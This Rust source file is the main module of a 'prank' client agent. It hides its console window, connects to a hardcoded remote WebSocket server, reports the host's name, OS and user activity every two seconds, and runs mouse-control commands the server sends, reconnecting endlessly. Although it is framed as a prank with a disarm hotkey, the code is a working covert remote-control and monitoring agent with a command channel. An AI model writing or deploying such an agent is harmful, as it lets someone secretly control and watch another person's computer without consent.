// Run silently in the background — no console window shown
#![cfg_attr(windows, windows_subsystem = "windows")]

mod pranks;
mod safety;

use futures_util::{SinkExt, StreamExt};
use pranker_core::{PrankType, WsMessage};
use pranks::PrankExecutor;
use safety::SafetyManager;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time::sleep;
use tokio_tungstenite::{
    connect_async,
    tungstenite::{client::IntoClientRequest, protocol::Message},
};
use tracing::{error, info, warn};

/// CONSTANT HARDCODED SERVER URL — PERMANENT (custom domain via Cloudflare → Render)
pub const DEFAULT_SERVER_URL: &str = "wss://prank.steamhub.qzz.io/ws";

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt::init();

    info!("🎭 Pranker Client Agent initializing...");
    info!("ℹ️ EMERGENCY DISARM HOTKEY: Press Ctrl + Alt + Shift + K or Escape 3 times");

    // Order of precedence:
    // 1. Command-line argument (--server <URL> or positional wss://...)
    // 2. Environment variable (PRANKER_SERVER_URL)
    // 3. Hardcoded DEFAULT_SERVER_URL
    let server_url = std::env::args()
        .nth(1)
        .or_else(|| std::env::var("PRANKER_SERVER_URL").ok())
        .unwrap_or_else(|| DEFAULT_SERVER_URL.to_string());

    info!("🔗 Target Server URL: {}", server_url);

    // Initialize safety manager (hotkeys & mouse tracking)
    let safety = SafetyManager::new();
    let executor = std::sync::Arc::new(PrankExecutor::new(safety.clone()));

    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "Unknown Host".to_string());

    let client_id = format!("{}-{}", hostname, std::process::id());

    loop {
        info!("Connecting to server at {}...", server_url);

        let mut request = match server_url.as_str().into_client_request() {
            Ok(req) => req,
            Err(e) => {
                error!("Failed to parse URL: {}", e);
                sleep(Duration::from_secs(3)).await;
                continue;
            }
        };

        request.headers_mut().insert(
            "User-Agent",
            "PrankerClient/1.0".parse().unwrap(),
        );

        let conn_res = connect_async(request).await;

        match conn_res {
            Ok((ws_stream, _)) => {
                info!("✅ Successfully connected to Pranker Server!");

                let (mut write, mut read) = ws_stream.split();

                // Register client
                let reg_msg = WsMessage::RegisterClient {
                    client_id: client_id.clone(),
                    hostname: hostname.clone(),
                    os_info: std::env::consts::OS.to_string(),
                };

                if let Ok(json) = serde_json::to_string(&reg_msg) {
                    let _ = write.send(Message::Text(json)).await;
                }

                // Spawn Heartbeat Task
                let client_id_hb = client_id.clone();
                let safety_hb = safety.clone();
                let executor_hb = executor.clone();
                let (hb_tx, mut hb_rx) = tokio::sync::mpsc::unbounded_channel::<String>();

                let hb_handle = tokio::spawn(async move {
                    loop {
                        sleep(Duration::from_secs(2)).await;

                        let hb_msg = WsMessage::ClientHeartbeat {
                            client_id: client_id_hb.clone(),
                            safe_mode_active: safety_hb.auto_pause.load(Ordering::Relaxed),
                            disarmed: safety_hb.disarmed.load(Ordering::Relaxed),
                            user_active: safety_hb.user_active.load(Ordering::Relaxed),
                            active_pranks: executor_hb.get_active_pranks(),
                        };

                        if let Ok(json) = serde_json::to_string(&hb_msg) {
                            if hb_tx.send(json).is_err() {
                                break;
                            }
                        }
                    }
                });

                // Read loop
                loop {
                    tokio::select! {
                        Some(hb_json) = hb_rx.recv() => {
                            if write.send(Message::Text(hb_json)).await.is_err() {
                                break;
                            }
                        }
                        maybe_msg = read.next() => {
                            match maybe_msg {
                                Some(Ok(Message::Text(text))) => {
                                    if let Ok(ws_msg) = serde_json::from_str::<WsMessage>(&text) {
                                        match ws_msg {
                                            WsMessage::PrankCommand { prank, enable } => {
                                                info!("Received Prank Command: {:?} (enable={})", prank, enable);
                                                executor.execute(prank, enable);
                                            }
                                            WsMessage::DisarmCommand => {
                                                warn!("🚨 Disarm command received from server!");
                                                safety.panic_disarm();
                                                executor.execute(PrankType::GhostMouse { intensity: 0, speed_ms: 0 }, false);
                                                executor.execute(PrankType::InvertMouse { duration_sec: 0 }, false);
                                            }
                                            _ => {}
                                        }
                                    }
                                }
                                Some(Ok(Message::Close(_))) | None => {
                                    warn!("Connection closed by server");
                                    break;
                                }
                                Some(Err(e)) => {
                                    error!("WebSocket error: {:?}", e);
                                    break;
                                }
                                _ => {}
                            }
                        }
                    }
                }

                hb_handle.abort();
            }
            Err(e) => {
                error!("Failed to connect: {:?}. Retrying in 3 seconds...", e);
            }
        }

        sleep(Duration::from_secs(3)).await;
    }
}

